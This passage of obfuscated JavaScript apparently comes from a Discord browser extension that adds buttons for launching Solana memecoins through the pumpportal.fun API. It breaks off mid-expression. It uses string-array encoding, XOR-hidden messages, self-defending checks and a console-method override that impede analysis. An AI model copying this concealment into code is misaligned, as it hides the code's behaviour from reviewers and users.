            }
          })(t);
          d.bplcS(Bg, e, n ? "success" : l(i));
        }
        return;
      } catch (f) {
        let t = "Unknown er" + l(s);
        d.LNMfR(f, Error)
          ? (t = f[l(a)])
          : d[l(u)](typeof f, d[l(c)])
          ? (t = f)
          : f && d.RnMyK(typeof f, l(279)) && (t = JSON.stringify(f)),
          Bg("Sell error: " + t, l(307));
      }
    },
    $R = async (t, e) => {
      const n = 279,
        r = 220,
        o = 232,
        i = 213,
        s = 224,
        a = 292,
        u = LR,
        c = {};
      (c[u(257)] = function (t, e) {
        return t === e;
      }),
        (c.cjWxv = "Unknown error"),
        (c.bRVUa = function (t, e) {
          return t instanceof e;
        }),
        (c[u(265)] = u(n));
      const l = c;
      try {
        if (l.MWYGl(e, "pump")) {
          const { msg: e, success: n } = await (async (t) => {
              const e = 462,
                n = 450,
                r = 450,
                o = 477,
                i = 477,
                s = 508,
                a = 493,
                u = 516,
                c = 442,
                l = 482,
                d = 459,
                f = 444,
                h = 445,
                p = 518,
                m = 440,
                g = 525,
                y = 463,
                w = 519,
                b = 495,
                v = 485,
                A = 512,
                k = 494,
                I = 484,
                S = 512,
                _ = 507,
                T = 454,
                C = 484,
                B = 515,
                E = 454,
                x = CR,
                P = {
                  nZkTk: function (t, e) {
                    return t & e;
                  },
                  fIYrx: function (t, e) {
                    return t % e;
                  },
                  LfzqQ: function (t, e) {
                    return t(e);
                  },
                  AvYzS: "pump",
                  YZxFS: function (t, e, n) {
                    return t(e, n);
                  },
                  JrClv: "application/json",
                  raXAO: function (t, e) {
                    return t === e;
                  },
                  Seoju: "Created token succes" + x(521),
                  kSVLz: function (t, e) {
                    return t instanceof e;
                  },
                  tjqYl: function (t, e) {
                    return t === e;
                  },
                  TTgPu: "string",
                };
              try {
                if (!Xg.getInstance()[x(e) + "enticated"]())
                  return {
                    msg: (function () {
                      let t;
                      return function () {
                        const e = OR;
                        if (!t) {
                          const n = new Uint8Array([
                              59, 68, 183, 102, 78, 94, 161, 52, 0, 88, 166, 52,
                              15, 66, 166, 124, 11, 89, 166, 125, 13, 86, 166,
                              113, 10,
                            ]),
                            r = 349321070,
                            o = new Uint8Array(n[e(484)]);
                          for (let t = 0; t < n[e(C)]; t++) {
                            const i = P.nZkTk(r >>> (8 * P[e(B)](t, 4)), 255);
                            o[t] = n[t] ^ i;
                          }
                          t = new TextDecoder()[e(E)](o);
                        }
                        return t;
                      };
                    })()(),
                    success: ![],
                  };
                const y = Zg[x(n) + "e"]().getSettings();
                let w = Jg[x(r) + "e"]()["generateKe" + x(501)]();
                const b = await P[x(476)](XR, t);
                if (!b)
                  return {
                    msg: (function () {
                      const t = x,
                        e = {};
                      (e[t(A)] = function (t, e) {
                        return t >>> e;
                      }),
                        (e[t(k)] = function (t, e) {
                          return t % e;
                        }),
                        (e.RuxcT = function (t, e) {
                          return t ^ e;
                        });
                      const n = e;
                      let r;
                      return function () {
                        const e = t;
                        if (!r) {
                          const t = new Uint8Array([
                              42, 86, 187, 120, 9, 83, 242, 96, 3, 23, 162, 102,
                              9, 71, 179, 102, 9, 23, 166, 123, 7, 82, 188, 52,
                              8, 86, 166, 117,
                            ]),
                            o = 349321068,
                            i = new Uint8Array(t[e(I)]);
                          for (let r = 0; r < t.length; r++) {
                            const s = 255 & n[e(S)](o, 8 * n.QuyWZ(r, 4));
                            i[r] = n[e(_)](t[r], s);
                          }
                          r = new TextDecoder()[e(T)](i);
                        }
                        return r;
                      };
                    })()(),
                    success: ![],
                  };
                const v = {};
                (v.name = b[x(483)]),
                  (v.symbol = b.ticker),
                  (v[x(o)] = b[x(i)]);
                const R = {
                    action: "create",
                    tokenMetadata: v,
                    mint: Gm.encode(w.secretKey),
                    denominatedInSol: "true",
                    amount: t.initialLiquidity,
                    slippage: (null == y ? void 0 : y[x(s)]) || 10,
                    priorityFee: (null == y ? void 0 : y.priorityFee) || 5e-4,
                    pool: P[x(a)],
                  },
                  O = await P[x(u)](
                    fetch,
                    "https://pumpportal.fun/api/tra" +
                      x(c) +
                      "=" +
                      (null == y ? void 0 : y[x(l)]),
                    {
                      method: x(d),
                      headers: { "Content-Type": P.JrClv },
                      body: JSON[x(514)](R),
                    }
                  );
                if (P[x(f)](O[x(h)], 200)) {
                  await O.json();
                  const t = {};
                  return (t.msg = P[x(p)]), (t[x(m)] = !![]), t;
                }
                const M = {};
                return (M.msg = O[x(g)]), (M[x(440)] = ![]), M;
              } catch (R) {
                let t = "Unknown er" + x(y);
                P[x(w)](R, Error)
                  ? (t = R.message)
                  : P.tjqYl(typeof R, P.TTgPu)
                  ? (t = R)
                  : R && P.raXAO(typeof R, x(b)) && (t = JSON.stringify(R));
                const e = {};
                return (e[x(v)] = "" + t), (e.success = ![]), e;
              }
            })(t),
            o = {};
          return (o[u(r)] = e), (o.success = n), o;
        }
        {
          const { msg: e, success: n } = await (async (t) => {
              const e = 447,
                n = 450,
                r = 462,
                o = 450,
                i = 522,
                s = 449,
                a = 498,
                u = 477,
                c = 457,
                l = 465,
                d = 482,
                f = 451,
                h = 472,
                p = 526,
                m = 487,
                g = 485,
                y = 440,
                w = 497,
                b = 505,
                v = 514,
                A = 484,
                k = 500,
                I = 454,
                S = CR,
                _ = {
                  zqEyz: function (t, e) {
                    return t & e;
                  },
                };
              (_[S(502)] = "application/json"),
                (_.OkoZd = S(e)),
                (_.tuePQ = "Unknown error"),
                (_.WfZmW = function (t, e) {
                  return t instanceof e;
                }),
                (_.uxdty = "object");
              const T = _;
              try {
                if (!Xg[S(n) + "e"]()[S(r) + "enticated"]())
                  return {
                    msg: (function () {
                      const t = {
                        FAqmp: function (t, e) {
                          return T.zqEyz(t, e);
                        },
                        NKZeW: function (t, e) {
                          return t >>> e;
                        },
                      };
                      let e;
                      return function () {
                        const n = OR;
                        if (!e) {
                          const r = new Uint8Array([
                              59, 68, 183, 102, 78, 94, 161, 52, 0, 88, 166, 52,
                              15, 66, 166, 124, 11, 89, 166, 125, 13, 86, 166,
                              113, 10,
                            ]),
                            o = 349321070,
                            i = new Uint8Array(r.length);
                          for (let e = 0; e < r[n(A)]; e++) {
                            const s = t[n(k)](t[n(528)](o, (e % 4) * 8), 255);
                            i[e] = r[e] ^ s;
                          }
                          e = new TextDecoder()[n(I)](i);
                        }
                        return e;
                      };
                    })()(),
                    success: ![],
                  };
                const e = await ZR(t);
                if (!e)
                  return {
                    msg: (function () {
                      const t = 484,
                        e = 503;
                      let n;
                      return function () {
                        const r = OR;
                        if (!n) {
                          const o = new Uint8Array([
                              46, 86, 187, 120, 13, 83, 242, 96, 7, 23, 162,
                              102, 13, 71, 179, 102, 13, 23, 166, 123, 3, 82,
                              188, 52, 12, 86, 166, 117,
                            ]),
                            i = 349321064,
                            s = new Uint8Array(o.length);
                          for (let n = 0; n < o[r(t)]; n++) {
                            const t = T[r(e)](i >>> ((n % 4) * 8), 255);
                            s[n] = o[n] ^ t;
                          }
                          n = new TextDecoder()[r(454)](s);
                        }
                        return n;
                      };
                    })()(),
                    success: ![],
                  };
                const w = Jg[S(n) + "e"]();
                await w.getVanity("bonk");
                let b = w.getKeyPair();
                const v = Zg[S(o) + "e"]()[S(i) + "s"](),
                  _ = {};
                _[S(s) + "pe"] = T.OHWee;
                const C = {};
                (C[S(483)] = e.name), (C[S(490)] = e[S(a)]), (C[S(u)] = e.uri);
                const B = await fetch(
                  S(c) +
                    S(l) +
                    "un/api/trade?api-key=" +
                    (null == v ? void 0 : v[S(d)]),
                  {
                    method: "POST",
                    headers: _,
                    body: JSON.stringify({
                      action: S(f),
                      tokenMetadata: C,
                      mint: Gm.encode(b[S(443)]),
                      denominatedInSol: "true",
                      amount: t[S(464) + "uidity"],
                      slippage: (null == v ? void 0 : v.slippage) || 10,
                      priorityFee: (null == v ? void 0 : v.priorityFee) || 5e-4,
                      pool: T.OkoZd,
                    }),
                  }
                );
                if (200 === B.status) {
                  await B[S(h)]();
                  const t = {};
                  return (
                    (t.msg = S(p) + S(m) + "sfully"), (t.success = !![]), t
                  );
                }
                const E = {};
                return (E[S(g)] = B[S(525)]), (E[S(y)] = ![]), E;
              } catch (sS) {
                let e = T[S(w)];
                T[S(b)](sS, Error)
                  ? (e = sS.message)
                  : "string" == typeof sS
                  ? (e = sS)
                  : sS && typeof sS === T.uxdty && (e = JSON[S(v)](sS));
                const n = {};
                return (n[S(g)] = "" + e), (n[S(y)] = ![]), n;
              }
            })(t),
            r = {};
          return (r.msg = e), (r[u(o)] = n), r;
        }
      } catch (d) {
        let t = l.cjWxv;
        l[u(i)](d, Error)
          ? (t = d[u(s)])
          : typeof d === u(a)
          ? (t = d)
          : d && l.MWYGl(typeof d, l.BoDFx) && (t = JSON[u(266)](d));
        const e = {};
        return (e.msg = "" + t), (e[u(232)] = ![]), e;
      }
    };
  function tO(t, e) {
    const n = iO();
    return (
      (tO = function (e, r) {
        let o = n[(e -= 465)];
        if (void 0 === tO.qjvSYs) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (tO.WfJKYX = i), (t = arguments), (tO.qjvSYs = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.wjhVwe = t),
              (this.PXNpRJ = [1, 0, 0]),
              (this.wSuMRn = function () {
                return "newState";
              }),
              (this.NZjqut = "\\w+ *\\(\\) *{\\w+ *"),
              (this.YDUoxI = "['|\"].+['|\"];? *}");
          };
          (e.prototype.sGOudA = function () {
            const t = new RegExp(this.NZjqut + this.YDUoxI).test(
              this.wSuMRn.toString()
            )
              ? --this.PXNpRJ[1]
              : --this.PXNpRJ[0];
            return this.VDeoCd(t);
          }),
            (e.prototype.VDeoCd = function (t) {
              return Boolean(~t) ? this.qUjhSN(this.wjhVwe) : t;
            }),
            (e.prototype.qUjhSN = function (t) {
              for (let e = 0, n = this.PXNpRJ.length; e < n; e++)
                this.PXNpRJ.push(Math.round(Math.random())),
                  (n = this.PXNpRJ.length);
              return t(this.PXNpRJ[0]);
            }),
            new e(tO).sGOudA(),
            (o = tO.WfJKYX(o)),
            (t[s] = o);
        }
        return o;
      }),
      tO(t, e)
    );
  }
  axiom;
  const eO = tO;
  !(function (t) {
    const e = 588,
      n = 496,
      r = 650,
      o = 530,
      i = 616,
      s = 576,
      a = 547,
      u = 622,
      c = 554,
      l = tO,
      d = t();
    for (; []; )
      try {
        if (
          192490 ===
          -parseInt(l(e)) / 1 +
            (-parseInt(l(647)) / 2) * (parseInt(l(n)) / 3) +
            (parseInt(l(r)) / 4) * (parseInt(l(o)) / 5) +
            -parseInt(l(i)) / 6 +
            (parseInt(l(s)) / 7) * (-parseInt(l(a)) / 8) +
            -parseInt(l(u)) / 9 +
            parseInt(l(c)) / 10
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(iO);
  const nO = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n[tO(581)](e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    rO = nO(void 0, function () {
      const t = 602,
        e = tO;
      return rO
        .toString()
        .search(e(t) + "+$")
        .toString()
        .constructor(rO)
        .search(e(t) + "+$");
    });
  rO();
  const oO = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  function iO() {
    const t = [
      "xZyYm2rL",
      "D2LKDgG",
      "CI1NCMfKAwvUDa",
      "nNb4ihjNyMeOma",
      "zMLUAxrLoWOGia",
      "C3rLBMvY",
      "mcuPoWOGicaGia",
      "BwvZC2fNzq",
      "m2eGmcuSicm0yq",
      "CMfUC2XHDgvyka",
      "DZOGmcaZChGGmq",
      "CgfKzgLUzZOGmq",
      "mZq2odmYrwfqsMDS",
      "FqOGicaGicaGia",
      "EdSkicaGicaGia",
      "mtm1zgvNlcaJmW",
      "z2v0uNbJq2XPzq",
      "Dw5KoIbSAw5Lyq",
      "icbIywnRz3jVDq",
      "odKZnZq2mg5Hs01erq",
      "yMLUza",
      "EWOGicaGicaGia",
      "BgWGmc4ZCYbLyq",
      "ALzdtfa",
      "ltuWjsK7cIaGia",
      "Ahr0Chm6lY94lG",
      "CxvLCNLtzwXLyW",
      "Dg9YqwXS",
      "icaGicaXmdaLia",
      "mdaLoWOGicaGia",
      "idePidaLlcbYzW",
      "ldaSmcWWlJyPoW",
      "y2XPy2S",
      "CMvHDguTy29PBG",
      "BM9Uzq",
      "icaGyMfJA2DYBW",
      "zw1WDhK",
      "zg9JDw1LBNrFAq",
      "y2XHC3noyw1L",
      "z2v0sw5ZDgfUyW",
      "zgL2lMvTyMvKqq",
      "mJfjBgDzyuW",
      "y2TNCM91BMq6ia",
      "icaGicaGih0kia",
      "mhb4ide4ChG7cG",
      "icaGicb0B3a6ia",
      "yxbWBhK",
      "BMq6igXPBMvHCG",
      "mJu1ldi1nsWYnq",
      "C3rYAw5N",
      "DdOGm3b4oWOGia",
      "mc4ZChG7cIaGia",
      "E30Uy29UC3rYDq",
      "mJi1nJKZtxbvvuPM",
      "igjVEc1ZAgfKBW",
      "Aw5KzxHpzG",
      "B2jQzwn0",
      "ruz6DLu",
      "AgfZvg9Rzw4",
      "C3jJ",
      "igLUC2v0idaGmq",
      "DdOGnJaWoWOGia",
      "yM9YzgvYoIbUBW",
      "qw9LzvO",
      "oWOGicaGicaGia",
      "re9nq29UDgvUDa",
      "y3rgD2K",
      "kcGOlISPkYKRkq",
      "tevbD2i",
      "Dgv4DenVBNrLBG",
      "DhjHy2u",
      "Dg9Y",
      "AwvUDc1IB3jKzq",
      "BMn0Aw9UkcKG",
      "icaGCgfKzgLUzW",
      "nJiZzgu",
      "zMLSDgvYoIbIBa",
      "mJnKzsa+igrPDG",
      "CJSkicaGicaGia",
      "zxjYB3i",
      "ys5LBwjLzfrPDa",
      "mtC1nZe2mgPzD0TLrW",
      "iZjHmMeYysaXma",
      "ChGGmcbYz2jHka",
      "zgL2lMDYAwrdBW",
      "ldaSmcWWlJmPla",
      "icbMB250lxnPEG",
      "nJe5mdiWrK1bs2vu",
      "yvTOCMvMkJ0IDa",
      "y3jLyxrLlwnVAq",
      "w2nSyxnZxJ0NBq",
      "B2jZzxj2zq",
      "Dg9W",
      "ztOGmtrWEdSkia",
      "yMeOmJu1ldi1nq",
      "C2L0Aw9UoIbHyG",
      "ldaSmcWWlJuPla",
      "oIbUB25LoWOGia",
      "C3rVCfbYB3bHzW",
      "cIaGicaGicaGlG",
      "lwDYywrPzw50ka",
      "yMfJA2DYB3vUza",
      "AgfZv2fSBgv0",
      "icaGicaGmcuGEW",
      "Dg9vChbLCKnHCW",
      "icaGigjVEc1ZAa",
      "lxjHzgL1CZOGnG",
      "z2v0uMfUz2vbDa",
      "B3i6icnMmgyWzG",
      "Bg9N",
      "lxnWywnPBMC6ia",
      "zgLZCgXHEq",
      "ndjMzK14CKe",
      "icaGCg9ZAxrPBW",
      "BNrHAw5LCL9FnG",
      "oty3odKYuhLIExLT",
      "icaGyw5PBwf0Aq",
      "C3rYAw5NAwz5",
      "iZu1ntSkicaGia",
      "y2HHBM5LBhmVkG",
      "ldi1nsWWlJePoW",
      "icaGicaGEI1PBG",
      "zgLLBNqOmtm1za",
      "cIaGicaGicaGia",
      "BJOGmcuGntaLoW",
      "icaGicaGicaGia",
      "C3r5Bgu",
      "icaGiduWjsb7ia",
      "zMLSDgvY",
      "ChvZAa",
      "mNb4ihjNyMeOma",
      "ys5VCMLNAw5HBa",
      "y3rVCIGICMv0Dq",
      "AhjLzG",
      "y2LUzZOGmc4ZCa",
      "zwf0zs1JB2LUlq",
      "idaUmNmGzwfZzq",
      "ywrKrxzLBNrmAq",
      "zM9YBtOGDhjHBG",
      "y2HPBgrmAxn0",
      "zw50",
      "ih0kicaGicaGia",
      "DxiOmtbWEcK7cG",
      "y29TBw9Uqw5Jzq",
      "lMvTyMvKqxv0Aa",
      "ihbVC2L0Aw9UoG",
      "AxnvC2vYqxv0Aa",
      "mZiYnJjprxnMrKW",
      "CMv0DxjUicHMDq",
      "y3jLyxrLrwXLBq",
      "kdeZnwrLzYWGiW",
      "DxrOB3jFxZyYmW",
      "zefdvui",
      "DgfIBgu",
      "ldaSmc44ktSkia",
      "yxbWzw5Kq2HPBa",
      "BwfW",
      "CM9Y",
      "mhb4ihjNyMeOma",
      "z2v0q2XPzw50uG",
      "EKXnAgW",
      "C3rHCNrZv2L0Aa",
      "ywrVDZOGmca0Ca",
      "y29UDgfPBMvYsq",
      "icaGicaGicaUzG",
      "Bg9HDgLUzY1JCG",
      "iaOGicaGicaGia",
      "Dg9tDhjPBMC",
      "y3jfshC",
      "mdaLktSkicaGia",
      "zgf0yxnLDa",
      "veLWB0S",
      "zxHJzxb0Aw9U",
      "AgfUz2u",
      "Bw91C2v1Ca",
      "BgvUz3rO",
      "AxrPB246igfSBa",
      "y29UC29Szq",
      "yM9KEq",
      "mty4lcaXotiSia",
      "z2v0u2vSzwn0Aq",
      "nwPvEwLXEG",
      "tgLUA19HzJaXnW",
      "CMfTzxmGz3jHza",
      "oIaZChG7cIaGia",
      "BwfYz2LUlwXLzG",
    ];
    return (iO = function () {
      return t;
    })();
  }
  oO(void 0, function () {
    const t = 608,
      e = 481,
      n = 644,
      r = 614,
      o = 526,
      i = 521,
      s = 605,
      a = 592,
      u = tO,
      c = {
        ghVro: function (t, e) {
          return t(e);
        },
        EFzvU: function (t, e) {
          return t + e;
        },
        jMcUC: u(497) + u(t),
        XssCD: u(587) + u(e) + 'rn this")( )',
        rSuOU: u(n),
        fxlgf: "info",
        TsKbn: u(r),
        YAjtW: u(502),
        cCsts: function (t, e) {
          return t < e;
        },
      },
      l = (function () {
        const t = u;
        let e;
        try {
          e = c.ghVro(Function, c[t(a)](c.jMcUC + c.XssCD, ");"))();
        } catch (n) {
          e = window;
        }
        return e;
      })(),
      d = (l[u(o)] = l.console || {}),
      f = [c.rSuOU, "warn", c.fxlgf, c.TsKbn, u(i), c.YAjtW, u(s)];
    for (let h = 0; c.cCsts(h, f.length); h++) {
      const t = oO.constructor.prototype[u(555)](oO),
        e = f[h],
        n = d[e] || t;
      (t.__proto__ = oO.bind(oO)),
        (t.toString = n.toString.bind(n)),
        (d[e] = t);
    }
  })(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  ({
    matches: ["https://discord.com/" + eO(468)],
    runAt: eO(572) + "dle",
    main() {
      const t = 493,
        e = 480,
        n = 531,
        r = 535,
        o = 523,
        i = 527,
        s = 504,
        a = 486,
        u = 598,
        c = 540,
        l = 522,
        d = 615,
        f = 517,
        h = 601,
        p = 558,
        m = 637,
        g = 551,
        y = 501,
        w = 542,
        b = 591,
        v = 466,
        A = 574,
        k = 606,
        I = 575,
        S = 500,
        _ = 561,
        T = 505,
        C = 482,
        E = 510,
        x = 510,
        P = 478,
        R = 506,
        O = 584,
        M = 466,
        L = 509,
        N = 477,
        D = 504,
        U = 633,
        q = 603,
        W = 488,
        z = 626,
        K = 489,
        F = 534,
        j = 474,
        G = 546,
        V = 579,
        H = 474,
        X = 621,
        Z = 474,
        J = 597,
        Y = 577,
        Q = 565,
        $ = 528,
        tt = 541,
        et = 564,
        nt = 643,
        rt = 525,
        ot = 485,
        it = 586,
        st = 503,
        at = 494,
        ut = 465,
        ct = 539,
        lt = 634,
        dt = 580,
        ft = 585,
        ht = 599,
        pt = 533,
        mt = 543,
        gt = 641,
        yt = 470,
        wt = 545,
        bt = 507,
        vt = 620,
        At = 618,
        kt = 583,
        It = 548,
        St = 476,
        _t = 490,
        Tt = 563,
        Ct = 473,
        Bt = 515,
        Et = 630,
        xt = 609,
        Pt = 549,
        Rt = 552,
        Ot = 537,
        Mt = 499,
        Lt = 518,
        Nt = 467,
        Dt = 613,
        Ut = 632,
        qt = 483,
        Wt = 596,
        zt = 544,
        Kt = 559,
        Ft = 557,
        jt = 511,
        Gt = 629,
        Vt = 472,
        Ht = 479,
        Xt = 611,
        Zt = 513,
        Jt = 514,
        Yt = 484,
        Qt = 553,
        $t = 635,
        te = 550,
        ee = 617,
        ne = 487,
        re = 472,
        oe = 589,
        ie = 538,
        se = 631,
        ae = 595,
        ue = 583,
        ce = 578,
        le = 573,
        de = 489,
        fe = 529,
        he = 519,
        pe = 610,
        me = 571,
        ge = 639,
        ye = 646,
        we = 569,
        be = 524,
        ve = 520,
        Ae = 475,
        ke = 627,
        Ie = 536,
        Se = 562,
        _e = 512,
        Te = 529,
        Ce = 642,
        Be = 492,
        Ee = 625,
        xe = 498,
        Pe = 604,
        Re = eO,
        Oe = {
          pobaR: "Deploy",
          hTTCS: function (t, e) {
            return t === e;
          },
          TIpoK: function (t, e) {
            return t - e;
          },
          rIeDK: function (t, e) {
            return t + e;
          },
          AynjM: function (t, e) {
            return t >= e;
          },
          pSQTk: function (t, e) {
            return t < e;
          },
          noRqE: function (t, e, n, r) {
            return t(e, n, r);
          },
          GypYI: "Create coin",
          LEAwb: "div.gridCo" + Re(649) + "23de > div.grid__623de",
          TeUPq: Re(567),
          zaFIf: Re(t) + "or__623de, .embedTitle__623de",
          uPGpk: Re(e) + Re(n) + "a",
          CslPA: "img.embedAuthorIcon_" + Re(r),
          KeUvy: "a[href]",
          zLMhl: function (t, e) {
            return t > e;
          },
          crEHw: function (t, e) {
            return t(e);
          },
          ctFwi: function (t, e) {
            return t(e);
          },
          jVCLP: function (t, e) {
            return t(e);
          },
          DOBcy: function (t, e) {
            return t(e);
          },
          JClpJ: function (t, e) {
            return t(e);
          },
          AYfjL: "Unknown error",
          dACUB: function (t, e) {
            return t instanceof e;
          },
          MuLlJ: function (t, e) {
            return t === e;
          },
          AoeeZ: Re(o),
        };
      IO("light");
      const Me = (() => {
        const t = Re,
          e = document[t(xe) + "ent"]("button");
        return (
          (e.className = "floating-c" + t(568) + "-btn"),
          (e[t(Pe) + "t"] = Oe.pobaR),
          e
        );
      })();
      document[Re(i)][Re(s) + "d"](Me);
      let Le = ![];
      document.addEventListener("mousedown", () => (Le = !![])),
        document[Re(a) + "stener"](Oe[Re(u)], () => (Le = ![]));
      const Ne = () => {
        const t = Re;
        if (Le) return;
        const e = window.getSelection();
        if (!e || Oe.hTTCS(e.toString().trim(), ""))
          return (Me.style[t(646)] = "none"), void 0;
        const n = (() => {
          const t = Re,
            e = window[t(Te) + "on"]();
          if (!e || Oe.hTTCS(e.rangeCount, 0)) return null;
          let n = e[t(Ce)](0)[t(Be) + "storContainer"];
          for (; n && n.nodeType === Node.TEXT_NODE; ) n = n.parentNode;
          if (!n) return null;
          const r = n.closest("div.grid__623de");
          return r || n.closest(t(Ee) + "essageContent']");
        })();
        if (!n) return (Me[t(475)][t(ye)] = t(we)), void 0;
        const r = e.getRangeAt(0)[t(508) + "ects"]();
        if (0 === r[t(be)]) return;
        const o = r[Oe[t(ve)](r.length, 1)];
        (Me.style.display = "block"),
          (Me[t(Ae)][t(ke)] = Oe.TIpoK(window.scrollY + o[t(ke)], 35) + "px"),
          (Me.style.left =
            Oe.rIeDK(window.scrollX + o.left, o[t(Ie)] / 2) + "px");
        const i = document["querySelec" + t(Se)]("div.grid__623de");
        Me.dataset[t(_e) + "d"] = Array.from(i)[t(590)](n)[t(516)]();
      };
      document[Re(a) + "stener"](Oe.AoeeZ, Ne),
        document["addEventLi" + Re(c)]("selectionc" + Re(l), Ne),
        Me.addEventListener(Oe.TeUPq, () => {
          const t = Re,
            e = window[t(fe) + "on"]();
          if (!e) return;
          const n = e.toString().trim();
          if (!n) return;
          let r = null;
          if (Me[t(he)].containerId) {
            const e = document.querySelectorAll("div.grid__" + t(pe)),
              n = parseInt(Me.dataset.containerId);
            Oe.AynjM(n, 0) && Oe.pSQTk(n, e.length) && (r = e[n]);
          }
          if (!r) return;
          const o = n,
            i = ((t) => {
              const e = Re,
                n = t.trim().split(/\s+/);
              return Oe.hTTCS(n.length, 1)
                ? n[0][e(ge) + "e"]()
                : n
                    .map((t) => {
                      var n;
                      return (
                        (null == (n = t[0]) ? void 0 : n[e(639) + "e"]()) || ""
                      );
                    })
                    .join("");
            })(n);
          Oe.noRqE(qe, r, o, i), e[t(me)](), (Me.style.display = "none");
        });
      const De = () => {
          const t = Re,
            e = document.querySelectorAll(Oe[t(q)]);
          for (let n = 0; n < e.length; ++n) Ue(e[n]);
        },
        Ue = (t) => {
          const e = Re,
            n = function (t, e) {
              return t(e);
            };
          if (t.querySelector(".create-coin-btn")) return;
          if (!t.querySelector("a.embedTitle__623de")) return;
          const r = (() => {
            const t = Re,
              e = document[t(498) + t(K)]("style");
            (e.textContent =
              "\n        .create-coin-btn {\n            " +
              t(F) +
              "t: 8px;\n  " +
              t(j) +
              t(G) +
              t(V) +
              t(H) +
              t(X) +
              t(628) +
              "           font-weight: 600;\n            cursor: pointer;\n  " +
              t(Z) +
              t(J) +
              "ne;\n            border-radius: 8px;\n            ba" +
              t(Y) +
              "linear-gra" +
              t(471) +
              "eg,rgba(63, 43, 150," +
              t(Q) +
              "ba(87, 143, 199, 1) 50%, rgba(" +
              t($) +
              "255, 1) 10" +
              t(tt) +
              "       background-size: 400% 4" +
              t(et) +
              "       col" +
              t(nt) +
              "0;\n            trans" +
              t(rt) +
              t(ot) +
              ";\n            letter" +
              t(645) +
              t(it) +
              "         text-shadow: 0 1px 2px rgba(0,0" +
              t(st) +
              "          " +
              t(at) +
              " relative;\n         " +
              t(ut) +
              "on: gradient-border 5s ease in" +
              t(ct) +
              "          z-index: 2" +
              t(599) +
              t(548) +
              t(lt) +
              "create-coin-btn::before {\n            content: '';\n         " +
              t(648) +
              "n: absolute;\n       " +
              t(dt) +
              "3px;\n            lef" +
              t(ft) +
              "          right: 3px" +
              t(ht) +
              "    bottom" +
              t(pt) +
              "         background: linear-gradient(135deg, #3a3a" +
              t(mt) +
              "4a4a 100%);\n            border" +
              t(gt) +
              "px;\n      " +
              t(yt) +
              "dex: -1;\n            box-shado" +
              t(wt) +
              t(bt) +
              t(vt) +
              " inset 0 1" +
              t(At) +
              t(kt) +
              "5,0.1);\n        }\n        \n        @keyf" +
              t(532) +
              t(607) +
              "r {\n      " +
              t(638) +
              " background-position: 0% 50%; " +
              t(It) +
              t(St) +
              t(636) +
              "-position: 100% 50%;" +
              t(_t) +
              t(Tt) +
              "{ background-positio" +
              t(Ct) +
              " }\n        }\n       " +
              t(Bt) +
              ".floating-create-coin-btn {\n          po" +
              t(Et) +
              "solute;\n          z-index: 9999;\n       " +
              t(xt) +
              ": 10px 18px;\n          border-radius: 8p" +
              t(Pt) +
              t(570) +
              t(Rt) +
              t(Ot) +
              t(Mt) +
              "2a2a2a 0%, #3a3a3a 1" +
              t(Lt) +
              "      color: #f0f0f0;\n          border: 1px solid " +
              t(Nt) +
              "      cursor: pointe" +
              t(Dt) +
              "   display" +
              t(Ut) +
              "        font-family: inherit;\n          letter-spa" +
              t(qt) +
              "x;\n          font-size: 14px;\n          font-weigh" +
              t(Wt) +
              "        transform: t" +
              t(zt) +
              t(Kt) +
              "       transition: a" +
              t(Ft) +
              "se;\n      " +
              t(640) +
              t(jt) +
              "x 12px rgba(0,0,0,0.4), inset 0 1px 0 rg" +
              t(Gt) +
              t(469) +
              t(Vt) +
              " text-shadow: 0 1px " +
              t(Ht) +
              t(566) +
              t(Vt) +
              " backdrop-" +
              t(Xt) +
              t(491) +
              "        }\n" +
              t(Zt) +
              t(Jt) +
              t(Yt) +
              "btn:hover " +
              t(556) +
              t(Qt) +
              t(582) +
              t($t) +
              t(te) +
              "a3a3a 0%, " +
              t(ee) +
              "0%);\n          border-color: #666;\n          trans" +
              t(ne) +
              "slateX(-50%) translateY(-2px);" +
              t(re) +
              t(oe) +
              "w: 0 6px 1" +
              t(ie) +
              t(se) +
              t(ae) +
              t(618) +
              t(ue) +
              "5,0.15);\n " +
              t(ce) +
              "     "),
              document.head.appendChild(e);
            const n = {};
            return (
              (n[t(le)] = t(624) + "n-btn"),
              (n.textContent = Oe.GypYI),
              Object.assign(document["createElem" + t(de)]("button"), n)
            );
          })();
          r.addEventListener(Oe.TeUPq, (e) => {
            const r = tO;
            e.preventDefault(), e[r(U) + "ation"](), n(qe, t);
          }),
            iy(t);
          (t.querySelector(Oe.zaFIf) || t)[e(D) + "d"](r);
        },
        qe = async (t, e = "", n = "") => {
          var r;
          const o = Re;
          try {
            const i = t.querySelector(o(d) + "le__623de");
            if (!i) return;
            const s = Xg.getInstance();
            if (!s[o(495) + "enticated"]()) {
              if (
                !(await Oe[o(f)](hy, () => s[o(495) + "enticated"]() === !![]))
              )
                return Oe[o(h)](B, null), void 0;
            }
            if (!s[o(593)]()) {
              if (!(await Oe[o(p)](hy, () => s[o(593)]() === !![])))
                return Oe.DOBcy(B, null), void 0;
            }
            let a = ((t, e = "", n = "", r) => {
              const o = Re,
                i = [],
                s = [],
                a = Zg[o(A) + "e"]().getSettings(),
                u = t[o(561) + o(k)](o(I) + o(S) + "de"),
                c = t[o(_) + "torAll"](Oe.uPGpk),
                l = null == u ? void 0 : u.querySelector(Oe.CslPA),
                d = !!t["querySelec" + o(k)](
